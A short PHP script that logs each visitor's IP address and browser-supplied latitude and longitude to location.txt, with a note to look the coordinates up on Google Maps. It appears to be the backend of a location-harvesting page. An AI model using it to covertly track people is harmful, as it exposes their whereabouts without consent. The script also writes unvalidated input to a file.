<?php
$ip=$_SERVER['REMOTE_ADDR'];







$lati = $_POST['lati'];
$long= $_POST['long'];


if(isset($_POST['lati']) && isset($_POST['long'])){
    $result = array($lati,$long);

    $myfile = fopen("location.txt", "a") or die("Unable to open file!");
    $txt ="IP: ".$ip."\n". "Search in google map: ". $lati."".", ". $long."\n";
    fwrite($myfile, $txt);
    fclose($myfile);
    
    echo "saved";
}else{
    header("Location:index.php");
}


?>
